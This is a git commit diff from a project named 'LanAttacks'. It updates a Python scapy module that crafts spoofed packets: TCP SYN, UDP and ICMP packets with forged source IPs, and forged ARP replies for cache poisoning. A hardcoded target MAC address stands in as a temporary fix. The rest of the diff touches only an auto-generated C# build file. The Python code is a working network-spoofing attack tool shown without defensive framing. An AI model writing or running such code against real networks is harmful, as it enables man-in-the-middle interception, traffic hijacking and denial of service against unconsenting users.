72b42029b24ae10f44e1ed34b51b7daa1cbb809b
Władysław Szajner <wladyslaw.szajner@gmail.com>
2023-04-14 20:05:36 +0200

    Spoofing tweaks: fixed TCP/IP and UDP methods by setting proper destination ports (also removed unused get_port function), temporarily fixed ARP by setting temp hwdst (might be required fixing get_mac function)

--- LanAttacks/PythonModules/SpoofingModule.py
+++ LanAttacks/PythonModules/SpoofingModule.py
@@ -3,24 +3,23 @@ import time
 import random
   
 def get_mac(ip):
-    answer, unanswer = scapy.arping(ip, verbose = False)
-    return answer[0][1].hwsrc
+    arp_request = scapy.ARP(pdst = ip)
+    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+    return answered_list[0][1].hwsrc
 
-def get_port(ip):
-    ping = scapy.IP(dst = ip)
-    response = scapy.sr1(ping, timeout=2)
-    return response[TCP].dport
   
 def spoof(target_ip, spoof_ip, protocol, packet_amount):
     src_port = random.randint(1024, 65535)  
     packet = None 
     try:
         if(protocol == "TCP/IP"):
-            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.TCP(sport = src_port, dport = get_port(target_ip), flags='S')
+            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.TCP(sport = src_port, dport = 80, flags='S')
         elif(protocol == "ARP"):
-            packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
+            packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "4d:cc:6a:4b:8d:b0", psrc = spoof_ip)
         elif(protocol == "UDP"):
-            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.UDP(sport = src_port, dport = get_port(target_ip))
+            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.UDP(sport = src_port, dport = 53)
         elif(protocol == "ICMP"):
             packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.ICMP()
     except Exception as e:
--- LanAttacks/obj/Debug/net6.0-windows/App.g.i.cs
+++ LanAttacks/obj/Debug/net6.0-windows/App.g.i.cs
@@ -45,7 +45,7 @@ namespace LanAttacks {
         /// InitializeComponent
         /// </summary>
         [System.Diagnostics.DebuggerNonUserCodeAttribute()]
-        [System.CodeDom.Compiler.GeneratedCodeAttribute("PresentationBuildTasks", "7.0.4.0")]
+        [System.CodeDom.Compiler.GeneratedCodeAttribute("PresentationBuildTasks", "6.0.3.0")]
         public void InitializeComponent() {
             
             #line 5 "..\..\..\App.xaml"
@@ -60,7 +60,7 @@ namespace LanAttacks {
         /// </summary>
         [System.STAThreadAttribute()]
         [System.Diagnostics.DebuggerNonUserCodeAttribute()]
-        [System.CodeDom.Compiler.GeneratedCodeAttribute("PresentationBuildTasks", "7.0.4.0")]
+        [System.CodeDom.Compiler.GeneratedCodeAttribute("PresentationBuildTasks", "6.0.3.0")]
         public static void Main() {
             LanAttacks.App app = new LanAttacks.App();
             app.InitializeComponent();
